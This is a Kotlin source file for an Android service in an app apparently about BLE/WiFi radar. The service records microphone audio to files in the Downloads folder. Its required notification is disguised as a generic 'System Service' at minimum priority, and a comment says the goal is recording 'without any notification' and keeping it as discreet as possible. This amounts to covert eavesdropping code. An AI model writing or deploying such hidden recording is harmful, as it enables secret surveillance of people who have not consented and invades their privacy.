package com.radar.blewifi

import android.app.*
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class AudioRecordService : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        if (action == ACTION_START) {
            startRecording()
        } else if (action == ACTION_STOP) {
            stopRecording()
            stopSelf()
        }
        return START_STICKY
    }

    private fun startRecording() {
        if (isRecording) return

        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "REC_$timeStamp.mp4"

        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.MIME_TYPE, "audio/mp4")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, "Download/BLESP")
                }
                val audioUri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (audioUri != null) {
                    val pfd = resolver.openFileDescriptor(audioUri, "w")
                    if (pfd != null) {
                        setOutputFile(pfd.fileDescriptor)
                    }
                }
            } else {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val blespDir = File(downloadsDir, "BLESP")
                if (!blespDir.exists()) blespDir.mkdirs()
                val outputFile = File(blespDir, fileName)
                setOutputFile(outputFile.absolutePath)
            }

            try {
                prepare()
                start()
                isRecording = true
                startForeground(NOTIFICATION_ID, createNotification())
            } catch (e: Exception) {
                Log.e("AudioRecordService", "Start recording failed: ${e.message}")
                e.printStackTrace()
            }
        }
    }

    private fun stopRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
        } catch (e: Exception) {
            Log.e("AudioRecordService", "stop() failed: ${e.message}")
        }
        mediaRecorder = null
        isRecording = false
    }

    private fun createNotification(): Notification {
        // As per requirements: "without any notification" usually means subtle or hidden, 
        // but Android requires foreground services to have a notification.
        // We'll make it as low priority/discreet as possible.
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Background process running")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now) // Generic icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "System Background Service",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    companion object {
        private const val NOTIFICATION_ID = 101
        private const val CHANNEL_ID = "AudioRecordChannel"
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
    }
}
